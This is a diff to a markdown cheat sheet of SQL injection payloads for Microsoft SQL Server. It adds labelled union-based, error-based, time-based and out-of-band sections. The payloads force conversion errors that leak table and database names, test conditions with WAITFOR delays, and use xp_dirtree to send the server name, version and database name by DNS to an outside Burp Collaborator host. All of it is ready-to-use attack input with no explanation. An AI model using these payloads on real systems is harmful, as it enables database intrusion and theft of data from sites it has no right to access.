@@ -86,13 +86,29 @@ www.example.com/xxx.php?id=1 or 1=1
 ## Microsoft SQL Server
 
 ```
+--------------------Union-Based----------------------
 ' OR LEN(CURRENT_USER)='3
 ' OR SUBSTRING(CURRENT_USER,1,3)='DBO
 ' OR LEN(db_name())=13;--
 ' OR SUBSTRING(db_name(),1,5)='xxxxx';--
-'*cast((SELECT @@version) as int)*'        # Error-based
-------------------------------------------
-OOB
+
+--------------------Error-Based----------------------
+'*cast((SELECT @@version) as int)*'        
+' and 1=convert(int,@@version)-- -
+' and 1=convert(int,(SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE'))-- -
+' and 1=convert(int,(select top 1 table_name from information_schema.tables))--
+' and 1=convert(int,(select top 1 name from sys.databases))--
+' and 1=convert(int,(select top 1 table_name from information_schema.tables where table_name not in ('xxxxx')))--
+' and 1=convert(int,(select top 1 name from sys.databases where name not in ('master','tempdb')))--
+
+---------------------Time-Based---------------------
+' if(len(current_user)=3 waitfor delay'0:0:20'--
+'IF CURRENT_USER='dbo' WAITFOR DELAY '00:00:15'--
+'IF((SELECT count(db_name()))=1) WAITFOR DELAY '00:00:5'--
+'IF((SELECT count(database_id) from sys.databases)=1) WAITFOR DELAY '00:00:5'--
+'IF((SELECT count(database_id) from sys.databases)=1) WAITFOR DELAY '00:00:5'--
+
+---------------------OOB---------------------
 ';declare @q varchar(200);set @q='\Wjrxfk8l48mhb5kh7d4s2v8zoquji8.'+(SELECT SUBSTRING(@@servername,1,9))+'.burpcollaborator.net\jje'; exec master.dbo.xp_dirtree @q;-- 
 ';declare @q varchar(200);set @q='\Wjrxfk8l48mhb5kh7d4s2v8zoquji8.'+(SELECT SUBSTRING(@@version,1,9))+'.burpcollaborator.net\jje'; exec master.dbo.xp_dirtree @q;-- 
 ';declare @q varchar(200);set @q='\Wjrxfk8l48mhb5kh7d4s2v8zoquji8.'+(SELECT SUBSTRING(DB_NAME(1),1,9))+'.burpcollaborator.net\jje'; exec master.dbo.xp_dirtree @q;-- 
